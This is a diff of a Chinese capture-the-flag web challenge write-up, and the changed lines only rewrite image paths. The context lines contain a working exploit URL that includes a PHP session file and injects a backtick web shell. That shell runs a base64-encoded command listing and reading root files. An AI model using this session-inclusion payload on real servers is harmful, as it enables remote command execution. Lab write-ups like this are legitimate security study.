@@ -8,13 +8,13 @@ Tag: WEB
 
 ### 过程
 
-![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png](%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png)
+![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png)
 
 请求的url后会写到session里请求的不能有空格 否则无法预览 页面 扫端口无果
 
 一头雾水 然后队友发现admin(有一说一 这题目真的脑瘫
 
-![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png](%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png)
+![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png)
 
 ```python
 <?php
@@ -48,7 +48,7 @@ show_source(__FILE__);
 http://127.0.0.1/admin/include123.php?u=/tmp/sess_00caa6eb6466d7285aea5af21eb5f6a1&a=<?php;$a=base64_decode($_GET[0]);echo`$a`;?>&0=bHMgLztjYXQgLyo=
 ```
 
-![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png](%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png)
+![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png)
 
 ### FLAG
 
